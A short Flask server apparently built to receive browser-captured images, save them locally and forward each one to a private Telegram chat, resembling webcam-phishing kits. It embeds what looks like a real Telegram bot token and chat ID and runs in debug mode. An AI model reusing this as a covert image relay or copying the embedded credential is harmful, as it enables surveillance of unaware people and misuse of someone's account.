from flask import Flask, render_template, request
import requests
import base64
from io import BytesIO
from PIL import Image
from datetime import datetime

app = Flask(__name__)

# Replace with your Telegram bot token and chat ID
BOT_TOKEN = '7912894287:AAHuWV6vj4ZSAYGwPH2UNMSL0XmKzwr3JSY'
CHAT_ID = '7167361126'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    image_data = data.get('image')

    if not image_data:
        return 'No image data', 400

    image_data = image_data.split(',')[1]
    image_bytes = base64.b64decode(image_data)

    # Optional: save locally with timestamp
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    filename = f"image_{timestamp}.jpg"
    with open(filename, 'wb') as f:
        f.write(image_bytes)

    # Send to Telegram
    send_to_telegram(image_bytes)

    return 'Image received', 200

def send_to_telegram(image_bytes):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
    files = {'photo': ('image.jpg', image_bytes)}
    data = {'chat_id': CHAT_ID}
    requests.post(url, files=files, data=data)

if __name__ == '__main__':
    app.run(debug=True)
